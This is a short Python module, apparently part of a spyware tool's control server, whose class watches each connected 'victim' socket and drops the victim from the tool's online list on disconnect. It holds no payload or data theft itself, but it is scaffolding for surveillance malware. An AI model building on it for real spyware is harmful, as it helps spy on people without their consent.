import socket

# self.nick = Stavros
# self.user_data = {IP, main_conn, data_conn}

class CheckConnection(object):

    def __init__(self, nick, user_data, my_spyware):
        self.nickname = nick
        self.user_data = user_data
        self.my_spyware = my_spyware

    def check_conn(self):
        while True:
            try:
                if self.nickname not in self.my_spyware.selected:
                    data = self.user_data[1].recv(1024)

                    if data:
                        pass
                    else:
                        raise ConnectionResetError

            except (ConnectionResetError, ConnectionAbortedError):
                self.victim_disconnected()
                break

    def victim_disconnected(self):
        del self.my_spyware.online[self.nickname]
        del self.my_spyware.check_conn_obj[self.nickname]